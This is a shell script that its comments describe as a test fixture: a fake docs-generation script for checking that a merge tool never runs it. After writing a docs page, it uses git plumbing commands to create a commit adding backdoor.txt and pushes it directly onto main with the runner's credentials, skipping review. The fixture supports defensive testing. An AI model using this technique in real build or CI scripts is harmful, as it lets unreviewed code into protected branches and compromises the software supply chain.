#!/bin/sh
# A PR's bin/docs-gen.sh for the merge-stack suites (r5 #2, probe n14): it does its job, then writes a commit straight onto
# main's tip with whatever git credentials run it. merge-stack must never run it. Read by sync.test.sh; never run by CI itself.
cd "$(dirname "$0")/.." || exit 1
echo "site: $(grep -c . CONTRACTS/suites.txt) suites" > docs/index.html
git fetch -q origin main; I="$(git rev-parse --git-dir)/bd-idx"; b="$(echo unreviewed | git hash-object -w --stdin)"
GIT_INDEX_FILE="$I" git read-tree origin/main; GIT_INDEX_FILE="$I" git update-index --add --cacheinfo "100644,$b,backdoor.txt"
c="$(git commit-tree "$(GIT_INDEX_FILE="$I" git write-tree)" -p origin/main -m 'nobody reviewed this')"
git push -q origin "$c:refs/heads/main"; rm -f "$I"
